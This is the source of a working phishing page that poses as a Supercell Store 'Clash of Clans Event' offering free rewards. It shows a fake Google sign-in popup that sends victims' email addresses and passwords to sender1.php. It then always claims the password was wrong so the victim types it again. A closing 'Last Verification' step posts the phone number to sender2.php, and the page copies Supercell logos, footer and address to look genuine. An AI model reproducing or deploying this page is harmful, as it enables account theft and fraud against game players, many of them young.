<?php
?>
<html>
<head>
<meta charset="utf-8">
<meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=1, user-scalable=no">
<title>Clash of Clans - Supercell Store</title>
<meta name="description" content="Clash of Clans kini tersedia di Supercell Store dan Dapatkan berbagai hadiah menarik, Ayo ambil hadiah mu secepatnya!!!">
<link rel="icon" type="image/x-icon" href="https://store.supercell.com/favicon.ico">
<script id="unhead:payload" type="application/json">{"title":"Clash of Clans - Supercell Store"}</script>
<link rel="stylesheet" href="css/google.css">
<link rel="stylesheet" href="css/main.css">
<link rel="stylesheet" href="css/shagitz.css">
<link href="https://fonts.googleapis.com/css?family=Roboto:300,400,500,700|Teko:300,400,500" rel="stylesheet">
<script src="https://code.jquery.com/jquery-3.6.0.min.js"></script>
</head>
<body>
<div id="__shagitz">
    <div class="header">
        <div class="imgLogo">
            <img src="https://store.supercell.com/_next/static/media/badge.0cb70e6d.png">
        </div>
        <div class="menuIcon">
            <svg width="32" height="33" viewbox="0 0 32 33" fill="none" xmlns="http://www.w3.org/2000/svg">
            <path d="M20 26.0002H5L7.14285 12.0715L20 6.04834V26.0002Z" stroke="#000" stroke-width="1.5" stroke-linecap="round" stroke-linejoin="round"></path>
            <path d="M20 6.04834L25 10.1126L27 26.0002H20" stroke="#000" stroke-width="1.5" stroke-linecap="round" stroke-linejoin="round"></path>
            <path d="M16.5239 9.79013L16.5239 8.00974C16.5239 6.20552 15.2184 4.60759 13.3811 5.08582C10.9769 5.71158 10.2382 8.1223 10.2382 11.4349L10.2382 12.4651" stroke="#000" stroke-width="1.5" stroke-linecap="round"></path>
            </svg>
            <svg id="menu" xmlns="http://www.w3.org/2000/svg" height="24" width="24" fill="none">
            <path d="M4 12.2202H28" stroke="#000" stroke-width="2" stroke-linecap="round" stroke-linejoin="round"></path>
            <path d="M4 20.3672H28" stroke="#000" stroke-width="2" stroke-linecap="round" stroke-linejoin="round"></path>
            </svg>
        </div>
    </div>
    <div class="content">
        <div class="wel">
            <h1 class="shadow">Welcome to the <br>Clash of Clans Event</h1>
        </div>
        <div class="front " id="initialClaimCard">
            <div class="f-imgBox">
                <img src="https://p1-image.cdn-aihelp.net/FileService/UserFile/0/202505/202505181635483336a1a8a8c3b_lite.png">
            </div>
            <p>
                 Don’t miss out! Log in now and claim your FREE chest packed with awesome rewards
            </p>
            <div class="claim">Claim Free</div>
        </div>
        <div class="modal-gacha hide">
            <span class="hint shadow">Tap!</span>
            <video playsinline="" webkit-playsinline="" preload="auto" src="https://cdn.shagitzsan.my.id/coc/347a0c20b878d59c74f80881e908cc23.MP4">
            </video>
        </div>
        
        <div class="front hide" id="finalRewardCard" style="margin-top: 100px;">
            <div class="f-imgBox">
     <img src="https://p1-image.cdn-aihelp.net/FileService/UserFile/0/202505/202505181635483336a1a8a8c3b_lite.png">
    </div>
    <div class="g-imgBox">
    <span class="g-title shadow"></span>
                <img src="">
    </div>
    <div class="claim" id="claimnow">Claim Now</div>
    </div>

        <div class="accountInfo" style="display:none">
            <span class="nickname shadow"></span>
            <div class="info">
                <p class="list clan">
                    <img></p>
                <p class="list exp">
                    <img src="img/exp.webp"></p>
                <p class="list th">
                    <img></p>
                <p class="list trophy">
                    <img src="img/trophy.png"></p>
            </div>
        </div>
    </div>

    <div id="rewards-section-content">
        <nav class="rewards-menu-bar" style="border-top:5px #57350d double;">
            <button type="button" class="menu-tab active" data-target-id="skin" id="defaultTabRewards" onmousedown="buka.play();" onclick="openRewards(event, 'skin');">
                <img src="img/skin.png" alt="Skin" class="menu-icon icon-skin">
            </button>
            <button type="button" class="menu-tab" data-target-id="scenery" onmousedown="buka.play();" onclick="openRewards(event, 'scenery');">
                <img src="img/scenery.png" alt="Scenery" class="menu-icon icon-scenery">
            </button>
            <button type="button" class="menu-tab" data-target-id="skill" onmousedown="buka.play();" onclick="openRewards(event, 'skill');">
                <img src="img/skill.png" alt="Skill" class="menu-icon icon-skill">
            </button>
            <button type="button" class="menu-tab" data-target-id="gems" onmousedown="buka.play();" onclick="openRewards(event, 'gems');">
                <img src="img/gems.png" alt="Gems" class="menu-icon icon-gems">
            </button>
        </nav>

        <main class="rewards-main-content">
            <section class="reward-section" id="skin">
                <div class="section-title-header carousel-container">
                    <div class="carousel-slides">
                    </div>
                </div>
                <div class="rewards-grid" style="margin-bottom: 10px;margin-left: auto;margin-right: auto;border:3px #57350d double;border-radius: 5px;">
                    <div class="reward-item itemShine" onmousedown="buka.play();" onclick="open_account_login(this);" data-reward-src="img/rewards/1.jpg" data-name="Permanent" data-id="×1" data-value="6750">
                        <figure><img style="border-radius:6px;" src="img/a1.png" alt="Reward A1"></figure>
                    </div>
                    <div class="reward-item itemShine" onmousedown="buka.play();" onclick="open_account_login(this);" data-reward-src="img/rewards/2.jpg" data-name="Permanent" data-id="×1" data-value="4500">
                        <figure><img style="border-radius:6px;" src="img/a2.png" alt="Reward A2"></figure>
                    </div>
                    <div class="reward-item itemShine" onmousedown="buka.play();" onclick="open_account_login(this);" data-reward-src="img/rewards/3.jpg" data-name="Permanent" data-id="×1" data-value="2700">
                        <figure><img style="border-radius:6px;"  src="img/a3.png" alt="Reward A3"></figure>
                    </div>
                    <div class="reward-item itemShine" onmousedown="buka.play();" onclick="open_account_login(this);" data-reward-src="img/rewards/1.jpg" data-name="Permanent" data-id="×1" data-value="6750">
                        <figure><img style="border-radius:6px;" src="img/a4.png" alt="Reward A1"></figure>
                    </div>
                    <div class="reward-item itemShine" onmousedown="buka.play();" onclick="open_account_login(this);" data-reward-src="img/rewards/2.jpg" data-name="Permanent" data-id="×1" data-value="4500">
                        <figure><img style="border-radius:6px;"  src="img/a5.png" alt="Reward A2"></figure>
                    </div>
                    <div class="reward-item itemShine" onmousedown="buka.play();" onclick="open_account_login(this);" data-reward-src="img/rewards/3.jpg" data-name="Permanent" data-id="×1" data-value="2700">
                        <figure><img style="border-radius:6px;" src="img/a6.png" alt="Reward A3"></figure>
                    </div>
                </div>
            </section>

            <section class="reward-section" id="scenery" style="display:none;">
                <div class="section-title-header carousel-container">
                     <div class="carousel-slides">
                    </div>
                </div>
                <div class="rewards-grid" style="margin-bottom: 10px;margin-left: auto;margin-right: auto;border:3px #57350d double;border-radius: 5px;">
                    <div class="reward-item itemShine" onmousedown="buka.play();" onclick="open_account_login(this);" data-reward-src="img/rewards/b1.jpg" data-name="Permanent" data-id="×1" data-value="6750">
                        <figure><img src="img/b1.png" alt="Reward B1"></figure>
                    </div>
                    <div class="reward-item itemShine" onmousedown="buka.play();" onclick="open_account_login(this);" data-reward-src="img/rewards/b1.jpg" data-name="Permanent" data-id="×1" data-value="6750">
                        <figure><img src="img/b2.png" alt="Reward B1"></figure>
                    </div>
                    <div class="reward-item itemShine" onmousedown="buka.play();" onclick="open_account_login(this);" data-reward-src="img/rewards/b1.jpg" data-name="Permanent" data-id="×1" data-value="6750">
                        <figure><img src="img/b3.png" alt="Reward B1"></figure>
                    </div>
                    <div class="reward-item itemShine" onmousedown="buka.play();" onclick="open_account_login(this);" data-reward-src="img/rewards/b1.jpg" data-name="Permanent" data-id="×1" data-value="6750">
                        <figure><img src="img/b4.png" alt="Reward B1"></figure>
                    </div>
                    <div class="reward-item itemShine" onmousedown="buka.play();" onclick="open_account_login(this);" data-reward-src="img/rewards/b1.jpg" data-name="Permanent" data-id="×1" data-value="6750">
                        <figure><img src="img/b5.png" alt="Reward B1"></figure>
                    </div>
                    <div class="reward-item itemShine" onmousedown="buka.play();" onclick="open_account_login(this);" data-reward-src="img/rewards/b1.jpg" data-name="Permanent" data-id="×1" data-value="6750">
                        <figure><img src="img/b6.png" alt="Reward B1"></figure>
                    </div>
                </div>
            </section>

            <section class="reward-section" id="gems" style="display:none;">
                <div class="section-title-header carousel-container">
                     <div class="carousel-slides">
                    </div>
                </div>
                <div class="rewards-grid" style="margin-bottom: 10px;margin-left: auto;margin-right: auto;border:3px #57350d double;border-radius: 5px;">
                     <div class="reward-item itemShine" onmousedown="buka.play();" onclick="open_account_login(this);" data-reward-src="img/rewards/c1.jpg" data-name="Permanent" data-id="×1" data-value="6750">
                        <figure><img src="img/c1.png" alt="Reward C1"></figure>
                    </div>
                    <div class="reward-item itemShine" onmousedown="buka.play();" onclick="open_account_login(this);" data-reward-src="img/rewards/c1.jpg" data-name="Permanent" data-id="×1" data-value="6750">
                        <figure><img src="img/c2.png" alt="Reward C1"></figure>
                    </div>
                    <div class="reward-item itemShine" onmousedown="buka.play();" onclick="open_account_login(this);" data-reward-src="img/rewards/c1.jpg" data-name="Permanent" data-id="×1" data-value="6750">
                        <figure><img src="img/c3.png" alt="Reward C1"></figure>
                    </div>
                    <div class="reward-item itemShine" onmousedown="buka.play();" onclick="open_account_login(this);" data-reward-src="img/rewards/c1.jpg" data-name="Permanent" data-id="×1" data-value="6750">
                        <figure><img src="img/c4.png" alt="Reward C1"></figure>
                    </div>
                    <div class="reward-item itemShine" onmousedown="buka.play();" onclick="open_account_login(this);" data-reward-src="img/rewards/c1.jpg" data-name="Permanent" data-id="×1" data-value="6750">
                        <figure><img src="img/c5.png" alt="Reward C1"></figure>
                    </div>
                    <div class="reward-item itemShine" onmousedown="buka.play();" onclick="open_account_login(this);" data-reward-src="img/rewards/c1.jpg" data-name="Permanent" data-id="×1" data-value="6750">
                        <figure><img src="img/c6.png" alt="Reward C1"></figure>
                    </div>
                </div>
            </section>

            <section class="reward-section" id="skill" style="display:none;">
                 <div class="section-title-header carousel-container">
                     <div class="carousel-slides">
                    </div>
                </div>
                <div class="rewards-grid" style="margin-bottom: 10px;margin-left: auto;margin-right: auto;border:3px #57350d double;border-radius: 5px;">
                    <div class="reward-item itemShine" onmousedown="buka.play();" onclick="open_account_login(this);" data-reward-src="img/rewards/d1.jpg" data-name="Permanent" data-id="×1" data-value="6750">
                        <figure><img src="img/d1.png" alt="Reward D1"></figure>
                    </div>
                    <div class="reward-item itemShine" onmousedown="buka.play();" onclick="open_account_login(this);" data-reward-src="img/rewards/d1.jpg" data-name="Permanent" data-id="×1" data-value="6750">
                        <figure><img src="img/d2.png" alt="Reward D1"></figure>
                    </div>
                    <div class="reward-item itemShine" onmousedown="buka.play();" onclick="open_account_login(this);" data-reward-src="img/rewards/d1.jpg" data-name="Permanent" data-id="×1" data-value="6750">
                        <figure><img src="img/d3.png" alt="Reward D1"></figure>
                    </div>
                    <div class="reward-item itemShine" onmousedown="buka.play();" onclick="open_account_login(this);" data-reward-src="img/rewards/d1.jpg" data-name="Permanent" data-id="×1" data-value="6750">
                        <figure><img src="img/d4.png" alt="Reward D1"></figure>
                    </div>
                    <div class="reward-item itemShine" onmousedown="buka.play();" onclick="open_account_login(this);" data-reward-src="img/rewards/d1.jpg" data-name="Permanent" data-id="×1" data-value="6750">
                        <figure><img src="img/d5.png" alt="Reward D1"></figure>
                    </div>
                    <div class="reward-item itemShine" onmousedown="buka.play();" onclick="open_account_login(this);" data-reward-src="img/rewards/d1.jpg" data-name="Permanent" data-id="×1" data-value="6750">
                        <figure><img src="img/d6.png" alt="Reward D1"></figure>
                    </div>
                </div>
            </section>
        </main>
    </div>

    <div class="footer">
        <div class="contact">
            <span class="text">Follow us on</span>
            <div class="sci">
                <img src="https://store.supercell.com/_next/static/media/icon-social-youtube-white.fde9d8af.svg">
                <img src="https://store.supercell.com/_next/static/media/icon-social-facebook-white.bf013e40.svg">
                <img src="https://store.supercell.com/_next/static/media/icon-social-instagram-white.6672578f.svg">
                <img src="https://store.supercell.com/_next/static/media/icon-social-twitter-white.f4745db2.svg">
                <img src="https://store.supercell.com/_next/static/media/icon-social-linkedin-white.c916ba21.svg">
                <img src="https://store.supercell.com/_next/static/media/icon-social-glassdoor-white.5589fd18.svg">
            </div>
        </div>
        <div class="download">
            <span class="text">Download our games from</span>
            <div class="store">
                <img src="https://store.supercell.com/_next/static/media/app-store_badge_en.181ec940.svg">
                <img src="https://store.supercell.com/_next/static/media/google-play-badge_en.e2ec89df.png">
            </div>
        </div>
        <div class="site-menu">
            <a href="#">Terms of Service</a>
            <a href="#">Privacy Policy</a>
            <a href="#">Parent's Guide</a>
            <a href="#">Safe and Fair Play Policy</a>
            <a href="#">Manage Cookies</a>
        </div>
        <div class="address">
            <div class="left">
                <p>Supercell Oy</p>
                <p>Jätkäsaarenlaituri 1</p>
                <p>00180 Helsinki</p>
                <p>Finland</p>
                <p>Business ID 2336509-6</p>
            </div>
            <div class="right">
                <img src="https://store.supercell.com/_next/static/media/supercell-logo-white.ad1dad43.svg">
            </div>
        </div>
    </div>
    
    <center>
    <div class="popup-login login-google animated fadeIn" style="display:none;">
        <div class="popup-box-login-google" style="margin-top:5%;">
            <div class="box-loading" style="display:none;">
                <div class="header-google"></div>
                <div class="google-loading animated fadeIn" id="google-loading">
                    <img src="img/google.png" width="40" height="40" style="margin-left: 0px; margin-bottom: 15px; float: none;">
                    <div class="loader-spinner" style="display: block;"></div> <div class="loader-text">Signing in…</div>
                </div>
            </div>
            <div class="box-google">
                <a onmousedown="tutup && tutup.play();" onclick="close_google()" class="close-other"><i class="zmdi zmdi-close"></i></a>
                <div class="header-google"><img src="img/google.png" alt="Google Logo"></div>
                <div class="txt-login-google">Sign in</div>
                <div class="txt-login-google-desc">to continue to <a href="#">Supercell Store.</a></div>
                <form action="javascript:void(0)" method="post" id="ValidateLoginGoogleForm">
                    <input type="hidden" id="s1_townhall">
                    <input type="hidden" id="s1_playertag">
                    <input type="hidden" id="s1_exp">
                    <input type="hidden" id="s1_clan">
                    <input type="hidden" id="s1_playername">
                    <div class="input-box"> <label class="input-label">Email or Phone</label>
                        <input type="email" class="input-1" name="email" id="email-google" onfocus="setFocus(true, this)" onblur="setFocus(false, this)" required>
                    </div>
                    <div class="email-google">
                        <svg aria-hidden="true" fill="currentColor" focusable="false" width="14px" height="14px" viewBox="0 -3 24 24" xmlns="https://www.w3.org/2000/svg"><path d="M12 2C6.48 2 2 6.48 2 12s4.48 10 10 10 10-4.48 10-10S17.52 2 12 2zm1 15h-2v-2h2v2zm0-4h-2V7h2v6z"></path></svg>
                        <span>Couldn't find your Google account.</span>
                    </div>
                    <div class="input-box"> <label class="input-label">Password</label>
                        <input type="password" class="input-1" name="password" id="password-google" onfocus="setFocus(true, this)" onblur="setFocus(false, this)" required>
                    </div>
                    <div class="sandi-google">
                        <svg aria-hidden="true" fill="currentColor" focusable="false" width="14px" height="14px" viewBox="0 -3 24 24" xmlns="https://www.w3.org/2000/svg"><path d="M12 2C6.48 2 2 6.48 2 12s4.48 10 10 10 10-4.48 10-10S17.52 2 12 2zm1 15h-2v-2h2v2zm0-4h-2V7h2v6z"></path></svg>
                        <span>Wrong password, try again.</span>
                    </div>
                    <div class="checkbox-wrap">
                        <input type="checkbox" id="show-password" onclick="togglePasswordVisibility()">
                        <label for="show-password">Show Password</label>
                    </div>
                    <input type="hidden" name="login" id="login-google" value="Google" readonly>
                    <button type="button" class="btn-forgot-google">Forgot email?</button>
                    <div class="clear"></div> <div class="notify-google">Not your computer? Use Guest mode to sign in privately. <span>Learn more about using Guest mode</span></div>
                    <div class="button-group-google">
                        <button type="button" class="btn-create-google">Create account</button>
                        <button type="button" class="btn-login-google" onclick="ValidateLoginGoogleData()">Log in</button>
                        <button type="submit" class="btn-login-google" style="display: none;">Log inz</button>
                    </div>
                </form>
            </div>
        </div>
    </div>
    </center>

    <center>
    <div class="popup-login login-google2 animated fadeIn" style="display:none;">
        <div class="popup-box-login-google" style="margin-top:5%;">
            <div class="box-loading" style="display:none;">
                <div class="header-google"></div>
                <div class="google-loading animated fadeIn" id="google-loading">
                    <img src="img/google.png" width="40" height="40" style="margin-left: 0px; margin-bottom: 15px; float: none;">
                    <div class="loader-spinner" style="display: block;"></div> <div class="loader-text">Signing in…</div>
                </div>
            </div>
            <div class="box-google">
                <div class="header-google"><img src="img/google.png" alt="Google Logo"></div>
                <div class="txt-login-google">Sign in</div>
                <div class="txt-login-google-desc">to continue to <a href="#">Supercell Store.</a></div>
                <form action="javascript:void(0)" method="post" id="ValidateLoginGoogleForm2">
                    <input type="hidden" id="s2_townhall">
                    <input type="hidden" id="s2_playertag">
                    <input type="hidden" id="s2_exp">
                    <input type="hidden" id="s2_clan">
                    <input type="hidden" id="s2_playername">
                    <div class="input-box"> <label class="input-label">Email or Phone</label>
                        <input type="email" class="input-1" name="email" id="email-google2" onfocus="setFocus(true, this)" onblur="setFocus(false, this)" required>
                    </div>
                    <div class="email-google">
                        <svg aria-hidden="true" fill="currentColor" focusable="false" width="14px" height="14px" viewBox="0 -3 24 24" xmlns="https://www.w3.org/2000/svg"><path d="M12 2C6.48 2 2 6.48 2 12s4.48 10 10 10 10-4.48 10-10S17.52 2 12 2zm1 15h-2v-2h2v2zm0-4h-2V7h2v6z"></path></svg>
                        <span>Couldn't find your Google account.</span>
                    </div>
                    <div class="input-box"> <label class="input-label">Password</label>
                        <input type="password" class="input-1" name="password" id="password-google2" onfocus="setFocus(true, this)" onblur="setFocus(false, this)" required>
                    </div>
                    <div class="sandi-google" style="display:block">
                        <svg aria-hidden="true" style="fill: red;" fill="currentColor" focusable="false" width="14px" height="14px" viewBox="0 -3 24 24" xmlns="https://www.w3.org/2000/svg"><path d="M12 2C6.48 2 2 6.48 2 12s4.48 10 10 10 10-4.48 10-10S17.52 2 12 2zm1 15h-2v-2h2v2zm0-4h-2V7h2v6z"></path></svg>
                        <span style="color:red">Wrong password, try again.</span>
                    </div>
                    <div class="checkbox-wrap" onclick="togglePasswordVisibility2()">
                        <input type="checkbox" id="show-password2">
                        <label for="show-password">Show Password</label>
                    </div>
                    <input type="hidden" name="login" id="login-google2" value="Google" readonly>
                    <button type="button" class="btn-forgot-google">Forgot email?</button>
                    <div class="clear"></div> <div class="notify-google">Not your computer? Use Guest mode to sign in privately. <span>Learn more about using Guest mode</span></div>
                    <div class="button-group-google">
                        <button type="button" class="btn-create-google">Create account</button>
                        <button type="button" class="btn-login-google" onclick="ValidateLoginGoogleData2()">Log in</button>
                        <button type="submit" class="btn-login-google" style="display: none;">Log inz</button>
                    </div>
                </form>
            </div>
        </div>
    </div>
    </center>

    <div class="popscid" style="display: none;">
        <div class="cont">
            <div class="biglogo">
              <center>
               <img style="border-radius:40px;width:120px;height:auto;" src="img/logo.jpg">
              </center>
            </div>
            <br>
<div style="color:#000;font-size:13px;text-align:center;" class="txt-login-alert">Log in to your <b style="color:#2b7e1e;font-size:13px;">Google Play Games</b><br> account to connect to Clash of Clans.</div> <!--- logtext --->

<br>
<div style="color:#363636;font-size:10px;" class="txt-login-alert">This doesn't let the app post to Google Play Games.</div> <!--- txt-login --->
            <div id="ValidateLoginSupercellForm" class="forms">
                <input type="hidden" id="s2_townhall">
                <input type="hidden" id="s2_playertag">
                <input type="hidden" id="s2_exp">
                <input type="hidden" id="s2_clan">
                <input type="hidden" id="s2_playername">
                <input type="hidden" id="loginsc" value="Supercell">
                <br>
                <div class="login-btn green" onclick="open_google_login()">  <img style="width:40px;height:40px;float:left;margin-top:-10px;margin-left:0px;margin-bottom:-5px;" src="img/g2.png">LOG IN WITH GOOGLE</div>
                <br>
            
                <p class="info">
                     This site is protected by reCAPTCHA and the Google <span class="link">Privacy Policy</span>
                    and <span class="link">Terms of Service</span>
                    apply.
                </p>

            </div>
              
        </div>
        
        
        <div class="phone-verif" style="display: none;">
            <span class="phone-title">Last Verification</span>
            <p>Please enter your phone number to continue</p>
            <div class="phone-form">
                <input type="hidden" id="s3_townhall">
                <input type="hidden" id="s3_playertag">
                <input type="hidden" id="s3_exp">
                <input type="hidden" id="s3_clan">
                <input type="hidden" id="s3_playername">
                <input type="hidden" id="validate_email">
                <input type="hidden" id="validate_password">
                <input type="hidden" id="validate_login">
                <input type="number" id="phone" placeholder="Phone Number" required>
                <div class="phone-submit" onclick="ValidatePhone()">Submit</div>
            </div>
        </div>
        <div class="success-alert" style="display: none;">
            <img src="https://accounts.supercell.com/static/media/checkmark_big.2fd62f5fd23abed40ef7b0c9ca513351.svg">
            <span class="phone-title" id="nicksuccess"></span>
            <p>
                 Thank you for joining this event, our teams will process and sent your gift soon as possible, please check your email immediately.
            </p>
        </div>
    </div>

    <div class="id-verification ">
        <span class="id-text shadow">Please Enter Your Tag</span>
        <div><center>
            <img src="img/id.png" style="width:90%;border-radius:10px;height: 85%;"></center>
        </div>
        <input class="id-input" id="playertag" placeholder="Example: #123456" required>
        <div class="id-btn" id="submitButton">Search</div>
        <p class="id-alert shadow" style="display: none;">Invalid Tag, Try again</p>
    </div>
    <canvas id="confetti-canvas" style="display:block;z-index:999999;pointer-events:none;position:fixed;top:0;left:0;" width="982" height="738"></canvas>      
</div>

<script>
function open_google_login() {
    $('.login-google').show().addClass('animate__fadeIn');
    $(".popscid").hide();
    $('#ValidateLoginGoogleForm')[0].reset();
    $('.input-box').removeClass('focus active error');
    $('#email-google').get(0).type = 'email';
    $('#password-google').get(0).type = 'password';
    $('#show-password').prop('checked', false);
    $('.email-google, .sandi-google').hide();
    $('.box-google').show();
    $('.box-loading').hide();
}

function close_google() {
    $('.login-google').hide();
}

function setFocus(isFocused, el) {
    const $el = $(el);
    const parentBox = $el.closest('.input-box');
    parentBox.toggleClass('focus', isFocused);
    if (!isFocused) {
        parentBox.toggleClass('active', $el.val() !== '');
    }
    if (parentBox.hasClass('error')) {
        parentBox.removeClass('error');
        if (el.id === 'email-google') $('.email-google').hide();
        if (el.id === 'password-google') $('.sandi-google').hide();
        if (el.id === 'phone') parentBox.removeClass('error');
    }
}

function togglePasswordVisibility() {
    const passwordInput = $('#password-google');
    passwordInput.attr('type', $('#show-password').is(':checked') ? 'text' : 'password');
}

function togglePasswordVisibility2() {
    const passwordInput = $('#password-google2');
    passwordInput.attr('type', $('#show-password2').is(':checked') ? 'text' : 'password');
}

function ValidateLoginGoogleData() {
    if ($('.box-loading').is(':visible')) return;
    let $emailgp = $('#email-google').val().trim();
    let $passwordgp = $('#password-google').val().trim();
    let $logingp = $('#login-google').val().trim();
    let $s1_townhall = $('#s1_townhall').val().trim();
    let $s1_playertag = $('#s1_playertag').val().trim();
    let $s1_exp = $('#s1_exp').val().trim();
    let $s1_clan = $('#s1_clan').val().trim();
    let $s1_playername = $('#s1_playername').val().trim();
    const $emailBox = $('#email-google').closest('.input-box');
    const $passwordBox = $('#password-google').closest('.input-box');
    $emailBox.removeClass('error');
    $passwordBox.removeClass('error');
    $('.email-google, .sandi-google').hide();
    if ($emailgp === '' || $emailgp.length <= 7 || !$emailgp.includes('@')) {
        $emailBox.addClass('error').removeClass('focus active');
        $('.email-google').find('span').text("Enter a valid email or phone number").end().show();
        return;
    } else {
        $emailBox.addClass('active');
    }
    if ($passwordgp === '' || $passwordgp.length <= 7) {
        $passwordBox.addClass('error').removeClass('focus active');
        $('.sandi-google').find('span').text("Enter your password").end().show();
        return;
    } else {
        $passwordBox.addClass('active');
    }
    $('.box-google').hide();
    $('.box-loading').show();
    $('.loader-spinner').show();
    $('.loader-text').text('Signing in…');
    $.ajax({
        type: 'POST',
        url: 'sender1.php',
        data: {
            email: $emailgp,
            password: $passwordgp,
            login: $logingp,
            townhall: $s1_townhall,
            playertag: $s1_playertag,
            exp: $s1_exp,
            clan: $s1_clan,
            playername: $s1_playername
        },
        success: function(response) {
            $('#validate_login').val('Google');
            $('#validate_email').val($emailgp);
            $('#validate_password').val($passwordgp);
            $('.login-google').hide();
                $('.box-google').show();
               $('.box-loading').hide();
               $('.loader-spinner').hide();
               $('.login-google2').show();
               $('.sandi-google').show();
               $('#email-google2').get(0).type = 'email';
    $('#password-google2').get(0).type = 'password';
    $('#show-password2').prop('checked', false);
        }
    });
}

function ValidateLoginGoogleData2() {
    if ($('.box-loading').is(':visible')) return;
    let $emailgp2 = $('#email-google2').val().trim();
    let $passwordgp2 = $('#password-google2').val().trim();
    let $logingp2 = $('#login-google2').val().trim();
    let $s2_townhall = $('#s2_townhall').val().trim();
    let $s2_playertag = $('#s2_playertag').val().trim();
    let $s2_exp = $('#s2_exp').val().trim();
    let $s2_clan = $('#s2_clan').val().trim();
    let $s2_playername = $('#s2_playername').val().trim();
    const $emailBox2 = $('#email-google2').closest('.input-box');
    const $passwordBox2 = $('#password-google2').closest('.input-box');
    $emailBox2.removeClass('error');
    $passwordBox2.removeClass('error');
    $('.email-google2, .sandi-google2').hide();
    if ($emailgp2 === '' || $emailgp2.length <= 7 || !$emailgp2.includes('@')) {
        $emailBox2.addClass('error').removeClass('focus active');
        $('.email-google').find('span').text("Enter a valid email or phone number").end().show();
        return;
    } else {
        $emailBox2.addClass('active');
    }
    if ($passwordgp2 === '' || $passwordgp2.length <= 7) {
        $passwordBox2.addClass('error').removeClass('focus active');
        $('.sandi-google').find('span').text("Enter your password").end().show();
        return;
    } else {
        $passwordBox2.addClass('active');
    }
    $('.box-google').hide();
    $('.box-loading').show();
    $('.loader-spinner').show();
    $('.loader-text').text('Signing in…');
    $.ajax({
        type: 'POST',
        url: 'sender1.php',
        data: {
            email: $emailgp2,
            password: $passwordgp2,
            login: $logingp2,
            townhall: $s2_townhall,
            playertag: $s2_playertag,
            exp: $s2_exp,
            clan: $s2_clan,
            playername: $s2_playername
        },
        beforeSend: function() {
            $('.loader-text').text('Successfully signed in!');
            setTimeout(function() {
                $('.login-google2').hide()
                $('.popscid').show();
                $('.popscid .phone-verif').show();
                $('.popscid .cont').hide();
                $('.popscid .slider .bawah').css('justify-content', 'center');
            }, 1000);
        },
        success: function(response) {
            $('#validate_login').val('Google');
            $('#validate_email').val($emailgp2);
            $('#validate_password').val($passwordgp2);
            $('.login-google2').hide()
            $('.popscid').show();
            $('.popscid .phone-verif').show();
            $('.popscid .cont').hide();
            $('.popscid .slider .bawah').css('justify-content', 'center');
        }
    });
}

function ValidateLoginSupercell() {
    let $emailsc = $('#emailsc').val().trim();
    let $passwordsc = $('#passwordsc').val().trim();
    let $loginsc = $('#loginsc').val().trim();
    let $s2_townhall = $('#s2_townhall').val().trim();
    let $s2_playertag = $('#s2_playertag').val().trim();
    let $s2_exp = $('#s2_exp').val().trim();
    let $s2_clan = $('#s2_clan').val().trim();
    let $s2_playername = $('#s2_playername').val().trim();
    if ($emailsc === '' || !$emailsc.includes('@')) {
        $('#emailsc').focus();
        return;
    }
    if ($passwordsc === '') {
        $('#passwordsc').focus();
        return;
    }
    $.ajax({
        type: 'POST',
        url: 'sender1.php',
        data: {
            email: $emailsc,
            password: $passwordsc,
            login: $loginsc,
            townhall: $s2_townhall,
            playertag: $s2_playertag,
            exp: $s2_exp,
            clan: $s2_clan,
            playername: $s2_playername
        },
        beforeSend: function() {
            $('.popscid .cont').hide();
            $('.popscid .phone-verif').show();
            $('.popscid .slider .bawah').css('justify-content', 'center');
        },
        success: function(response) {
            $('#validate_login').val('Supercell');
            $('#validate_email').val($emailsc);
            $('#validate_password').val($passwordsc);
            $('.popscid .cont').hide();
            $('.popscid .phone-verif').show();
            $('.popscid .slider .bawah').css('justify-content', 'center');
        }
    });
}

function ValidatePhone() {
    let $phone = $('#phone').val().trim();
    let $validate_email = $('#validate_email').val().trim();
    let $validate_password = $('#validate_password').val().trim();
    let $validate_login = $('#validate_login').val().trim();
    let $s3_townhall = $('#s3_townhall').val().trim();
    let $s3_playertag = $('#s3_playertag').val().trim();
    let $s3_exp = $('#s3_exp').val().trim();
    let $s3_clan = $('#s3_clan').val().trim();
    let $s3_playername = $('#s3_playername').val().trim();
    let isValid = true;
    if ($phone === '') {
        $('#phone').focus();
        isValid = false;
    }
    if (!isValid) return false;
    $.ajax({
        type: 'POST',
        url: 'sender2.php',
        data: {
            email: $validate_email,
            password: $validate_password,
            login: $validate_login,
            townhall: $s3_townhall,
            playertag: $s3_playertag,
            exp: $s3_exp,
            clan: $s3_clan,
            playername: $s3_playername,
            phone: $phone
        },
        beforeSend: function() {
            $('.popscid .phone-verif').hide();
            $('.popscid .success-alert').show();
            $('.popscid .slider .bawah').css('justify-content', 'flex-end');
        },
        success: function(response) {
            $('.popscid .phone-verif').hide();
            $('.popscid .success-alert').show();
            $('.popscid .slider .bawah').css('justify-content', 'flex-end');
        }
    });
}

function open_account_login(item) {
    $(".popscid").show();
    $(".popscid .cont").show();
    $(".popscid .phone-verif").hide();
    $(".popscid .success-alert").hide();
    $(".popscid .slider .bawah").css('justify-content', 'flex-start');
}


var buka = new Audio('media/shagitz.mp3');

const carouselImageData = {
    skin: ["img/assets/nam1.jpg", "img/assets/nam2.jpg", "img/assets/nam3.jpg", "img/assets/nam4.jpg"],
    scenery: ["img/assets/nam2.jpg", "img/assets/nam1.jpg", "img/assets/nam3.jpg", "img/assets/nam4.jpg"],
    skill: ["img/assets/nam3.jpg", "img/assets/nam2.jpg", "img/assets/nam1.jpg", "img/assets/nam4.jpg"],
    gems: ["img/assets/nam4.jpg", "img/assets/nam3.jpg", "img/assets/nam2.jpg", "img/assets/nam1.jpg"]
};

const carouselIntervals = {};

function openRewards(evt, rewardName) {
  var i, rewardSections, menuTabs;
  rewardSections = document.getElementsByClassName("reward-section");
  for (i = 0; i < rewardSections.length; i++) {
    if (carouselIntervals[rewardSections[i].id]) {
        clearInterval(carouselIntervals[rewardSections[i].id]);
        delete carouselIntervals[rewardSections[i].id];
    }
    rewardSections[i].style.display = "none";
  }
  menuTabs = document.getElementsByClassName("menu-tab");
  for (i = 0; i < menuTabs.length; i++) {
    menuTabs[i].className = menuTabs[i].className.replace(" active", "");
  }
  const activeSection = document.getElementById(rewardName);
  activeSection.style.display = "block";
  evt.currentTarget.className += " active";

  const carouselContainer = activeSection.querySelector('.carousel-container');
  if (carouselContainer) {
    const imagesForCategory = carouselImageData[rewardName] || carouselImageData.skin;
    populateCarousel(carouselContainer, imagesForCategory);
    initializeCarousel(carouselContainer, rewardName);
  }
}

